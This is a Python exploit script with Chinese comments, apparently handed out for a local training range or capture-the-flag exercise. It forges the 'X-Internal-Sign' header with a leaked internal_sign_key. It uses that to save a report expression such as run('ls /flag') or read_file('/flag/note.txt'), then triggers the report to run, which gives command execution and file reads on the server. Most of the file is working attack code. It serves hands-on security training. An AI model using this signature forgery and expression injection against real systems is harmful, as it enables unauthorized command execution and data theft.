# -*- coding: utf-8 -*-
# ============================================================================
#  小工具 2：修改报表配置并触发执行
# ----------------------------------------------------------------------------
#  用途：把「伪造签名 -> 改字段 -> 触发执行 -> 看结果」这套动作打包好，
#        你只需要改一行表达式，不用自己写 HTTP 和签名代码。
#
#  用法：
#      1) 把 BASE 改成靶场地址（默认已填好）
#      2) 把 KEY 换成你从数据文件里读到的 internal_sign_key
#      3) 把 EXPR 改成你想让系统求值的表达式
#      4) 执行： python 执行表达式.py
#
#  表达式可用函数（见靶场 /help/expression）：
#      report_total(name)   正常业务表达式
#      run(cmd)             执行命令，例如 run("ls /flag")
#      read_file(path)      读文件，例如 read_file("/flag/note.txt")
# ============================================================================

BASE = "http://127.0.0.1:18081"                 # 靶场地址
KEY  = "把 internal_sign_key 粘贴到这里"          # ★ 从数据文件里读到的密钥
NAME = "ops_health"                             # 要操作的报表名

EXPR = 'run("ls /flag")'                        # ★★★ 只需要改这一行 ★★★

# ----------------------------------------------------------------------------
import hashlib
import json
import urllib.error
import urllib.request


def sign(action, name, value):
    """
    按系统内部约定计算签名：
        sha256("{action}|{name}|{value}|{key}")

    action = "config"  -> 修改报表配置
    action = "execute" -> 触发报表执行
    """
    raw = "%s|%s|%s|%s" % (action, name, value, KEY)
    return hashlib.sha256(raw.encode("utf-8")).hexdigest()


def post(path, obj, headers=None):
    """发送一个 JSON POST 请求，返回 (状态码, 响应体文本)"""
    data = json.dumps(obj).encode("utf-8")
    h = {"Content-Type": "application/json"}      # ← 少了这个头，服务端收不到 JSON
    h.update(headers or {})
    req = urllib.request.Request(BASE + path, data=data, headers=h, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def main():
    if "粘贴到这里" in KEY or not KEY.strip():
        print("!! 请先把 KEY 换成你从数据文件里读到的 internal_sign_key")
        return

    print("靶场地址 :", BASE)
    print("报表名   :", NAME)
    print("本次表达式:", EXPR)
    print("-" * 70)

    # 第 1 步：修改报表配置（用 config 签名）
    body = {"name": NAME, "value": EXPR}
    sig = sign("config", NAME, EXPR)
    status, text = post("/api/report/config/save", body, {"X-Internal-Sign": sig})
    print("[1] 修改配置 :", status, text)

    # 第 2 步：触发报表执行（用 execute 签名，value 为空）
    body = {"name": NAME}
    sig = sign("execute", NAME, "")
    status, text = post("/internal/report/execute", body, {"X-Internal-Sign": sig})
    print("[2] 执行结果 :", status, text)

    print("-" * 70)
    print("提示：结果里 result 字段就是表达式的求值结果。")
    print("      做完实验记得把字段改回正常业务表达式：")
    print("          EXPR = 'report_total(\"%s\")'" % NAME)


if __name__ == "__main__":
    main()
